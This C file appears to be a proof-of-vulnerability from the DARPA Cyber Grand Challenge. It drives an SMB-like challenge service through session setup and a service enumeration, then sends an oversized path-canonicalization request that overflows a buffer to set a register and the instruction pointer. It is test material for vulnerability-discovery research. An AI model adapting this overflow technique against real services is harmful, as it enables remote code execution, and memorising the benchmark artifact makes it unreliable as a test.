/*

Author: Debbie Nuttall <debbie@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>
#include <libcgc.h>

#define TO_CB   1
#define FROM_CB 0
#define TO_SF   3
#define FROM_SF 3


int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}


int strcat(char *restrict s1, const char *restrict s2) {
  uint32_t i,j;
  int length = 0;

  if (!s1 || !s2) {
    return(0);
  }

  for (i = strlen(s1), j = 0; j < strlen(s2); i++, j++, length++) {
    s1[i] = s2[j];
  }
  s1[i] = '\0';

  return(length);
}


int main(void) {
  // negotiate
  type1_vals t1vals;
  type1_negotiate(0xEEEEEEEE, 0xEEEEEEEE, 5, &t1vals);

  // perform POV
  char negotiate[26] = "\x00\x15\x00\x00\x00\x42\x4d\x7c\xc4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x31";
  char negotiate_response[30];

  char session[59] = "\x00\x36\x00\x00\x00\x42\x4d\x7c\xc4\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x04\xaaV\xab\x01\x00\x00\x00\x00\x00\x19\x00S\x16\x00zkQmNNphInOGYFgyexSKdi";
  char session_response[27];

  char tree_connect[78] = "\x00\x49\x00\x00\x00\x42\x4d\x7c\xc4\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x04\xaaV\xab\xff\xff\x30\x00\x1b\x00\x66SqlMzZqcwBQYGKyqhUtupcDTbv\x08\x00SOMETREE\x07\x00\x45YEPSEE";
  char tree_connect_response[34];

  char file_create[48] = "\x00\x2b\x00\x00\x00\x42\x4d\x7c\xc4\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x04\xaaV\xab\xff\xff\x34\x5c:\xc8\x32\x00\x00\x00\x0a\x00\x08\x00NETSTUFF";
  char file_create_response[36];

  char transaction_bind[50] = "\x00\x2d\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x34\x5c:\xc8\x11\x2d\x0e\x00\xa0\x00\x08\x00NETSTUFF\xdc\x00";
  char transaction_bind_response[44];

  char transaction_write_enum[46] = "\x00\x29\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x05\x16\xf4\x8d\xb4\x3d\x0a\x00\xa1\x00\xc7\xccur\xb2\x00\x00\x00";
  char transaction_write_enum_response[512];

  char transaction_write_canon[512] = "\x00\x31\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x34\x5c:\xc8\x11\x2d\x12\x00\xa1\x00\xe4\x2d\x61\xe1\xbc\x00";
  char transaction_write_canon_response[512];

  char quit[24] = "\x00\x13\x00\x00\x00\x42\x4d\x7c\xc4\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
  char quit_response[24];

  SendToCB(negotiate, sizeof(negotiate));
  ReceiveFromCB(negotiate_response, 30);
  uint32_t sessionKey = *(uint32_t *)&negotiate_response[24];
  memcpy(session + 22, (char *)&sessionKey, 4);
  SendToCB(session, sizeof(session));
  ReceiveFromCB(session_response, 27);
  memcpy(tree_connect + 22, (char *)&sessionKey, 4);
  SendToCB(tree_connect, sizeof(tree_connect));
  ReceiveFromCB(tree_connect_response, 34);
  uint32_t connectionID = *(uint32_t *)&tree_connect_response[30];
  memcpy(file_create + 22, (char *)&sessionKey, 4);
  memcpy(file_create + 28, (char *)&connectionID, 4);
  SendToCB(file_create, sizeof(file_create));
  ReceiveFromCB(file_create_response, 34);
  uint16_t fileID = *(uint16_t *)&file_create_response[32];
  memcpy(transaction_bind + 22, (char *)&sessionKey, 4);
  memcpy(transaction_bind + 28, (char *)&connectionID, 4);
  memcpy(transaction_bind + 32, (char *)&fileID, 2);
  SendToCB(transaction_bind, sizeof(transaction_bind));
  ReceiveFromCB(transaction_bind_response, 44);
  uint32_t bindID = *(uint32_t *)&transaction_bind_response[40];
  memcpy(transaction_write_enum + 22, (char *)&sessionKey, 4);
  memcpy(transaction_write_enum + 28, (char *)&connectionID, 4);
  memcpy(transaction_write_enum + 32, (char *)&fileID, 2);
  memcpy(transaction_write_enum + 38, (char *)&bindID, 4);
  SendToCB(transaction_write_enum, sizeof(transaction_write_enum));
  ReceiveFromCB(transaction_write_enum_response, 43);
  uint16_t responseLength = *(uint16_t *)&transaction_write_enum_response[41];
  ReceiveFromCB(&transaction_write_enum_response[43], responseLength );
  
  char *serviceStart = &transaction_write_enum_response[45];
  memcpy(transaction_write_canon + 22, (char *)&sessionKey, 4);
  memcpy(transaction_write_canon + 28, (char *)&connectionID, 4);
  memcpy(transaction_write_canon + 32, (char *)&fileID, 2);
  memcpy(transaction_write_canon + 38, (char *)&bindID, 4);
  uint16_t length;
  length = strcat(transaction_write_canon + 46, serviceStart);
  transaction_write_canon[46+length] = '\xd2';
  length += 1;

  int serviceLength = strlen(serviceStart);
  if (serviceLength > 64)
  {
    _terminate(0);
  }
  char badpath[256];
  badpath[0]= '\xd3';
  int i;
  for( i = 1; i < serviceLength+48; i++)
  {
    badpath[i] = '\xd1';
  }
  badpath[i++] = '\xd3';
  badpath[i++] = '\x40';
  badpath[i++] = '\xd3';
  badpath[i++] = '\xd1';
  badpath[i++] = '\xd3';
  *(uint32_t *)&badpath[i] = t1vals.regval | 0x01010101;
  i+=4;
  *(uint32_t *)&badpath[i] = t1vals.ipval | 0x01010101;
  i+=4;
  for (int j=i; j< i+20; j++)
  {
    badpath[j] = j;
  }

  length += strcat(transaction_write_canon + 46 + length, badpath);
  memcpy(transaction_write_canon + 44, (char *)&length, 2); // Request Length
  length += 10;  
  memcpy(transaction_write_canon + 34, (char *)&length, 2); // Data Length
  length += 33;
  memcpy(transaction_write_canon + 1, (char *)&length, 2); // Message length
  SendToCB(transaction_write_canon, length + 6);
  ReceiveFromCB(transaction_write_canon_response, 34);
  return 0;
}
